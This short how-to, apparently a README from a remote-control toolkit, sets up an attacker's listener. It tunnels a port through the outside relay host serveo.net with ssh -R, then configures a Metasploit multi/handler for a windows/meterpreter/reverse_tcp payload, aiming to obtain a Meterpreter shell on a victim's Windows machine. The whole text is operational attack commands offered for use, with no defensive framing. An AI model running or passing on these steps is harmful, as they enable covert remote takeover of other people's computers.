HOW TO CONTROL:

1.install openssh

2.type "ssh -R 3249:localhost:3249 serveo.net

3.start msfconsole

4.use multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost localhost;set lport 3249;exploit

5.GET A METERPRETER SHELL!!